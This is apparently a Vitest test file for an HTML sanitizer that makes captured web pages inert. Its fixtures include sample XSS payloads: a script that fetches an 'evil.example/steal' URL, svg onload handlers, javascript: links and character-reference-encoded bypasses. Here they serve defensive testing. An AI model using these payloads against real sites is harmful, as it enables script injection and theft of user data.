/**
 * cinatra#2044 S6 (L-B) — the INERTNESS contract: "no scripts, event handlers,
 * or live remote documents ever enter cinatra's realm".
 */
import { describe, expect, it } from "vitest";

import {
  findInertnessViolations,
  isCapturedHtmlInert,
  sanitizeCapturedHtml,
} from "@/lib/artifacts/cms-preview-inertness";

describe("cinatra#2044 L-B — captured-page inertness", () => {
  it("removes scripts, frames, handlers, and executable URLs from a hostile page", () => {
    const hostile = `<!DOCTYPE html><html><head>
      <base href="https://evil.example/">
      <meta http-equiv="refresh" content="0;url=https://evil.example">
      <link rel="preload" as="script" href="https://evil.example/x.js">
      <script>fetch('https://evil.example/steal')</script>
      </head><body onload="steal()">
      <div data-cinatra-region="content" onclick="alert(1)">hello</div>
      <iframe src="https://evil.example/live"></iframe>
      <object data="x.swf"></object><embed src="y">
      <a href="javascript:alert(1)">x</a>
      <img src="data:text/html,<script>1</script>">
      <noscript>fallback</noscript>
      </body></html>`;

    const out = sanitizeCapturedHtml(hostile);
    expect(isCapturedHtmlInert(out.html)).toBe(true);
    expect(findInertnessViolations(out.html)).toEqual([]);
    expect(out.removed.scripts).toBeGreaterThan(0);
    expect(out.removed.frames).toBeGreaterThan(0);
    expect(out.removed.eventHandlers).toBeGreaterThan(0);
    expect(out.removed.navigations).toBeGreaterThan(0);
    expect(out.removed.unsafeUrls).toBeGreaterThan(0);
  });

  it("keeps the VISUAL document — the capture must still be a faithful render", () => {
    const page = `<html><head><link rel="stylesheet" href="/theme.css"></head>
      <body class="theme"><h1 class="t" style="color:red">Title</h1>
      <div class="cinatra-region" data-cinatra-region="content" data-cinatra-post="7">
      <p>Body text</p><img src="/uploads/a.png" alt="a"></div></body></html>`;
    const out = sanitizeCapturedHtml(page);
    expect(out.html).toContain('rel="stylesheet"');
    expect(out.html).toContain('data-cinatra-region="content"');
    expect(out.html).toContain('data-cinatra-post="7"');
    expect(out.html).toContain('src="/uploads/a.png"');
    expect(out.html).toContain("Body text");
    expect(out.html).toContain('style="color:red"');
  });

  it("is idempotent — re-sanitizing an inert page removes nothing more", () => {
    const once = sanitizeCapturedHtml("<div onclick='x()'><script>a</script>hi</div>");
    const twice = sanitizeCapturedHtml(once.html);
    expect(twice.html).toBe(once.html);
    expect(Object.values(twice.removed).reduce((a, b) => a + b, 0)).toBe(0);
  });

  it("handles multi-line, attribute-quoted, and unquoted handler forms", () => {
    const messy = `<div ONCLICK=alert(1) data-x=1><span on-mouse="no">keep</span>
      <script
        type="module">
        const a = 1;
      </script></div>`;
    const out = sanitizeCapturedHtml(messy);
    expect(isCapturedHtmlInert(out.html)).toBe(true);
    expect(out.html).toContain("keep");
    expect(out.html).toContain("data-x=1");
  });

  it("reports what survived when a document cannot be made inert", () => {
    // The verifier is the contract, not the sanitizer's own bookkeeping.
    expect(findInertnessViolations("<iframe src=x>").map((v) => v.kind)).toContain("frame");
    expect(findInertnessViolations("<div onmouseover=1>").map((v) => v.kind)).toContain(
      "event-handler",
    );
    expect(isCapturedHtmlInert("<p>plain</p>")).toBe(true);
  });

  // -------------------------------------------------------------------------
  // ENCODED / SEPARATOR bypasses (codex convergence findings). A browser decodes
  // character references before acting on an attribute, so a raw-text matcher
  // read a different document than the renderer would. L-D makes these reachable
  // from PROPOSED content, so both the sanitizer and the verifier now normalize
  // first.
  // -------------------------------------------------------------------------

  it("removes a meta refresh whose http-equiv is written with character references", () => {
    const encoded = '<meta http-equiv="&#x72;efresh" content="0;url=/wp-admin/">';
    const out = sanitizeCapturedHtml(encoded);
    expect(out.html).not.toContain("meta");
    expect(isCapturedHtmlInert(out.html)).toBe(true);
    // And the verifier catches it even if the sanitizer ever regressed.
    expect(findInertnessViolations(encoded).map((v) => v.kind)).toContain("meta-refresh");
  });

  it("removes an event handler introduced with a decimal reference", () => {
    const encoded = '<div &#111;nclick="steal()">body</div>';
    expect(findInertnessViolations(encoded).map((v) => v.kind)).toContain("event-handler");
    expect(isCapturedHtmlInert(sanitizeCapturedHtml(encoded).html)).toBe(true);
  });

  it("removes an event handler separated by a solidus rather than whitespace", () => {
    const svg = "<svg/onload=alert(1)></svg>";
    expect(findInertnessViolations(svg).map((v) => v.kind)).toContain("event-handler");
    const out = sanitizeCapturedHtml(svg);
    expect(out.html).not.toContain("onload");
    expect(isCapturedHtmlInert(out.html)).toBe(true);
  });

  it("removes an encoded javascript: URL scheme", () => {
    const encoded = '<a href="&#106;avascript:alert(1)">x</a>';
    expect(findInertnessViolations(encoded).map((v) => v.kind)).toContain("unsafe-url");
    expect(isCapturedHtmlInert(sanitizeCapturedHtml(encoded).html)).toBe(true);
  });
});
